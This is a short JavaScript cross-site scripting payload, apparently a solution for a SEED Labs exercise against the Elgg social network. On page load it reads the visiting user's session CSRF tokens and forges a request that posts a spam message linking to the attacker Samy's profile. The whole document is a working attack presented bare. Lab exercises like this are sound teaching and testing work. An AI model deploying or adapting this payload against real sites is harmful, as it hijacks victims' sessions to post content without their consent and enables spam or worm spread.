<script type="text/javascript">
    window.onload = function() {
        var ts = elgg.security.token.__elgg_ts;
        var token = elgg.security.token.__elgg_token;
        var name = elgg.session.user.name;
        var guid = elgg.session.user.guid;

        var sendurl = "/action/thewire/add";

        // If the user is Samy, then the attack is not performed
        if (name == "Samy") return;

        var postBody = "To earn 12 USD/Hour(!), visit now\nhttp://www.seed-server.com/profile/samy";

        var formData = new FormData();
        formData.append('__elgg_token', token);
        formData.append('__elgg_ts', ts);
        formData.append('body', postBody);
        

        var ajax = new XMLHttpRequest();
        ajax.open("POST", sendurl, true);
        ajax.setRequestHeader("Host", "www.seed-server.com");
        ajax.send(formData);
    }
</script>